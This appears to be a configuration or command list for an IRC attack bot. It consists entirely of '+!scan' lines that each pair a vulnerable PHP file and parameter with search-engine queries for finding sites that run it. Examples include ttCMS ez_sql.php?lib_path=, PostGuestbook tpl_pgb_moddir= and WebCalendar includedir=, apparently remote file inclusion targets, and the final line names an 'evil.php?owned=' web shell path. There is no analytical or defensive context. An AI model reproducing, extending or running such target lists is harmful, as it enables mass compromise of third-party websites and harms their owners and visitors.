+!scan kalender.php?vis= allinurl:".php?vis="
+!scan lang.php?arg= allinurl:.php?arg=
+!scan lang.php?arq= allinurl:.php?arq=
+!scan lang.php?lk= allinurl:".php?lk="
+!scan lang.php?ln= allinurl:.php?ln=
+!scan lang.php?subpage= allinurl:".php?subpage="
+!scan lang.php?subp= allinurl:".php?sub="
+!scan lang.php?subp= allinurl:".php?subp="
+!scan /lib/db/ez_sql.php?lib_path= ttCMS
+!scan /lib/db/ez_sql.php?lib_path= ttCMS <= v4
+!scan /lib/static/header.php?set_menu= iPhoto Album
+!scan /lib/static/header.php?set_menu= iPhotoAlbum
+!scan /lib/static/header.php?set_menu= iPhotoAlbum v1.1
+!scan link.php?do= allinurl:".php?do="
+!scan list.php?product= allinurl:.php?product=
+!scan list.php?table= allinurl:.php?table=
+!scan ln.php?ln= allinurl:.php?ln=
+!scan loc.php?l= allinurl:".php?l="
+!scan loc.php?l= allinurl:".php?loc="
+!scan loc.php?lang= allinurl:".php?lang="
+!scan loc.php?lang= allinurl:".php?loc="
+!scan loc.php?loc= allinurl:"loc.php?loc="
+!scan loc.php?loc= allinurl:".php?loc="
+!scan login.php?loca= .php?loca=
+!scan magazine.php?inc= allinurl:".php?inc="
+!scan main1.php?arg= allinurl:.php?arg=
+!scan main1.php?ln= allinurl:.php?ln=
+!scan main2.php?ln= allinurl:.php?ln=
+!scan main.html.php?seite= allinurl:.php?seite=
+!scan main.php3?act= allinurl:"main.php3?act="
+!scan main.php3?act= allinurl:".php3?act="
+!scan main.php5?page= .php5?id=
+!scan main.php?a= allinurl:".php?a="
+!scan main.php?arg= allinurl:.php?arg=
+!scan main.php?ba= allinurl:"main.php?ba="
+!scan main.php?ba= allinurl:".php?ba="
+!scan main.php?command= allinurl:"main.php?command="
+!scan main.php?command= allinurl:".php?command="
+!scan main.php?d1= allinurl:"main.php?d1="
+!scan main.php?d1= allinurl:".php?d1="
+!scan main.php?f1= allinurl:".php?f1="
+!scan main.php?fset= allinurl:".php?fset="
+!scan main.php?id= inurl:"main.php?id=*.php"
+!scan main.php?inc= allinurl:".php?inc="
+!scan main.php?ln= allinurl:.php?ln=
+!scan main.php?ltr= allinurl:".php?ltr="
+!scan main.php?s= allinurl:"main.php?s="
+!scan main.php?s= allinurl:main.php?s=
+!scan main.php?s= allinurl:.php?s=
+!scan main.php?s= allinurl:".php?s="
+!scan main.php?sit= allinurl:".php?sit="
+!scan main.php?table= allinurl:.php?table=
+!scan main.php?vis= allinurl:"main.php?vis="
+!scan main.php?vis= allinurl:main.php?vis=
+!scan main.php?vis= allinurl:".php?vis="
+!scan mai.php?act= allinurl:"mai.php?act="
+!scan mai.php?act= allinurl:mai.php?act=
+!scan mai.php?loc= allinurl:"mai.php?loc="
+!scan mai.php?loc= allinurl:mai.php?loc=
+!scan mai.php?src= allinurl:"mai.php?src="
+!scan mai.php?src= allinurl:mai.php?src=
+!scan map.php?loc= map.php?loc=
+!scan middle.php?file= inurl:"middle.php?file="
+!scan middle.php?file= inurl:"middle.php?page="
+!scan middle.php?file= inurl:".php?file="
+!scan middle.php?file= inurl:".php?page="
+!scan middle.php?file= middle.php?file=
+!scan middle.php?file= middle.php?page=
+!scan middle.php?file= .php?file=
+!scan middle.php?file= .php?page=
+!scan middle.php?page= inurl:"middle.php?page="
+!scan middle.php?page= inurl:".php?page="
+!scan middle.php?page= middle.php?page=
+!scan middle.php?page= .php?page=
+!scan misc.php?do= allinurl:".php?do="
+!scan mod.php?mod= allinurl:"mod.php?mod="
+!scan mod.php?mod= allinurl:".php?mod="
+!scan module.php?mod= allinurl:"module.php?mod="
+!scan module.php?mod= allinurl:".php?mod="
+!scan /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= allinurl:"PostGuestbook"
+!scan /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= inurl:"PostGuestbook"
+!scan /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= inurl:"PostGuestbook 0.6.1"
+!scan /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= "PostGuestbook"
+!scan /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= PostGuestbook
+!scan /modules/postguestbook/styles/internal/header.php?tpl_pgb_moddir= PostGuestbook 0.6.1
+!scan modul.php?mod= allinurl:"modul.php?mod="
+!scan modul.php?mod= allinurl:".php?mod="
+!scan more.php?sub= "more.php?sub="
+!scan more.php?sub= more.php?sub=
+!scan nav.php?g= "nav.php?g="
+!scan nav.php?g= nav.php?g=
+!scan nav.php?go= "nav.php?go="
+!scan nav.php?go= nav.php?go=
+!scan nav.php?lk= allinurl:".php?lk="
+!scan nav.php?ln= allinurl:.php?ln=
+!scan nav.php?loc= nav.php
+!scan nav.php?loc= nav.php?loc=
+!scan nav.php?loc= .php?loc=
+!scan nav.php?nav= "nav.php?nav="
+!scan nav.php?nav= nav.php?nav=
+!scan nav.php?page= "nav.php?page="
+!scan nav.php?page= nav.php?page=
+!scan nav.php?pagina= "nav.php?pagina="
+!scan nav.php?pagina= nav.php?pagina=
+!scan nav.php?pag= "nav.php?pag="
+!scan nav.php?pag= nav.php?pag=
+!scan nav.php?pg= "nav.php?pg="
+!scan nav.php?pg= nav.php?pg=
+!scan nav.php?p= "nav.php?p="
+!scan nav.php?p= nav.php?p=
+!scan order.php?lang= order.php?lang=
+!scan order.php?list= order.php?list=
+!scan order.php?ln= order.php?ln=
+!scan order.php?l= order.php?l=
+!scan order.php?page= order.php?page=
+!scan order.php?pag= order.php?pag=
+!scan order.php?pg= order.php?pg=
+!scan order.php?p= order.php?p=
+!scan order.php?wp= order.php?wp=
+!scan order.php?wp= .php?wp=
+!scan /?page= .php5?id=
+!scan page.php5?id= page.php5?id=
+!scan page.php5?id= .php5?id=
+!scan page.php?arq= allinurl:.php?arq=
+!scan page.php?ln= allinurl:.php?ln=
+!scan page.php?p= allinurl:"page.php?p="
+!scan page.php?p= allinurl:page.php?p=
+!scan page.php?p= allinurl:.php?p=
+!scan page.php?p= allinurl:".php?p="
+!scan page.php?s= allinurl:"page.php?s="
+!scan page.php?s= allinurl:page.php?s=
+!scan page.php?s= allinurl:.php?s=
+!scan page.php?s= allinurl:".php?s="
+!scan /?pag= .php5?id=
+!scan /palportal/index.php?page= /palportal/
+!scan /palportal/index.php?page= pal portal
+!scan /?pg= .php5?id=
+!scan /?p= .php5?id=
+!scan p.php?p= allinurl:.php?p=
+!scan p.php?p= allinurl:".php?p="
+!scan p.php?p= allinurl:"p.php?p="
+!scan p.php?p= "p.php?p="
+!scan p.php?p= p.php?p=
+!scan presse.php?do= allinurl:".php?do="
+!scan presse.php?do= allinurl:"presse.php?do="
+!scan print.php?pager= allinurl:.php?pager=
+!scan print.php?pager= .php?pager=
+!scan print.php?pager= print.php?pager=
+!scan print.php?table= allinurl:.php?table=
+!scan proddetail.php?prod= allinurl:".php?prod="
+!scan prod.php?prod= allinurl:".php?prod="
+!scan products.php?prod= allinurl:".php?prod="
+!scan produit.php?prod= allinurl:".php?prod="
+!scan produkt.php?prod= allinurl:".php?prod="
+!scan /read.php?fpage= /read.php?fpage=
+!scan reports.php?sub= "reports.php?sub="
+!scan reports.php?sub= reports.php?sub=
+!scan rss.php?phpraid_dir= allinurl:"phpraid"
+!scan rss.php?phpraid_dir= allinurl:phpraid
+!scan rss.php?phpraid_dir= inurl:""$2-"
+!scan rss.php?phpraid_dir= inurl:"php raid"
+!scan rss.php?phpraid_dir= php raid
+!scan rss.php?phpraid_dir= phpraid
+!scan s1.php?ln= allinurl:.php?ln=
+!scan search.php?exec= search.php?exec=
+!scan shop.php?prod= allinurl:".php?prod="
+!scan shop.pl/page= shop.pl/page=
+!scan show.php?page1= allinurl:".php?page1="
+!scan show.php?product= allinurl:.php?product=
+!scan show.php?product= allinurl:show.php?product=
+!scan side.php?arq= allinurl:.php?arq=
+!scan side.php?table= allinurl:.php?table=
+!scan side.php?vis= allinurl:.php?vis=
+!scan side.php?vis= allinurl:side.php?vis=
+!scan site.php?arq= allinurl:.php?arq=
+!scan site.php?meio= allinurl:.php?meio=
+!scan site.php?table= allinurl:.php?table=
+!scan s.php?table= allinurl:.php?table=
+!scan start.php?id= allinurl:".php?id="
+!scan start.php?id= allinurl:"start.php?id="
+!scan start.php?id= allinurl:start.php?id=
+!scan start.php?lang= allinurl:".php?lang="
+!scan start.php?lang= allinurl:"start.php?lang="
+!scan start.php?lang= allinurl:start.php?lang=
+!scan start.php?lang= .php?lang=
+!scan start.php?lang= start.php?lang=
+!scan start.php?mod= allinurl:".php?mod="
+!scan start.php?mod= allinurl:"start.php?mod="
+!scan start.php?page= allinurl:".php?page="
+!scan start.php?page= allinurl:"start.php?page="
+!scan start.php?page= start.php?page=
+!scan start.php?pag= start.php?pag=
+!scan start.php?pg= start.php?pg=
+!scan start.php?p= start.php?p=
+!scan start.php?s= allinurl:".php?s="
+!scan start.php?s= allinurl:"start.php?s="
+!scan start.php?s= allinurl:start.php?s=
+!scan start.php?s= start.php?s=
+!scan str.php?lang= str.php?lang=
+!scan str.php?ln= str.php?ln=
+!scan str.php?l= str.php?l=
+!scan str.php?page= str.php?page=
+!scan str.php?p= str.php?p=
+!scan sub.php?menu= "sub.php?menu="
+!scan sub.php?menu= sub.php?menu=
+!scan sub.php?s= "sub.php?s="
+!scan sub.php?s= sub.php?s=
+!scan sub.php?sub= "sub.php?sub="
+!scan sub.php?sub= sub.php?sub=
+!scan task.php?task= allinurl:.php?task=
+!scan task.php?task= allinurl:task.php?task=
+!scan /templates/mangobery/footer.sample.php?Site_Path= Mangobery
+!scan /templates/mangobery/footer.sample.php?Site_Path= Mangobery 0.5.5
+!scan /templates/mangobery/footer.sample.php?Site_Path= Mangobery-0.5.5
+!scan trans.php?trans= allinurl:".php?trans="
+!scan trans.php?trans= allinurl:"trans.php?trans="
+!scan /trans/trans.php?trans=eng&page= allinurl:".php?trans="
+!scan /trans/trans.php?trans=en&page= allinurl:".php?trans="
+!scan /trans/trans.php?trans=fr&page= allinurl:".php?trans="
+!scan /trans/trans.php?trans=ko&page= allinurl:".php?trans="
+!scan /trans/trans.php?trans=&page= allinurl:".php?trans="
+!scan /trans/trans.php?trans=&p= allinurl:".php?trans="
+!scan view.php?sub= "view.php?sub="
+!scan view.php?sub= view.php?sub=
+!scan view.php?table= allinurl:.php?table=
+!scan voir.php?inc= allinurl:".php?inc="
+!scan werbungFrame.php?do= allinurl:".php?do="
+!scan /ws/get_events.php?includedir= "WebCalendar"
+!scan /ws/get_events.php?includedir= Web Calendar
+!scan /ws/get_events.php?includedir= WebCalendar
+!scan /ws/get_events.php?includedir= WebCalendar v0.9.45
+!scan /ws/get_reminders.php?includedir= WebCalendar
+!scan /ws/get_reminders.php?includedir= WebCalendar v0.9.45
+!scan /ws/login.php?includedir= WebCalendar
+!scan /ws/login.php?includedir= WebCalendar v0.9.45
+!scan ocp-103/index.php?req_path= ocPortal
+!scan images/evil.php?owned= e107
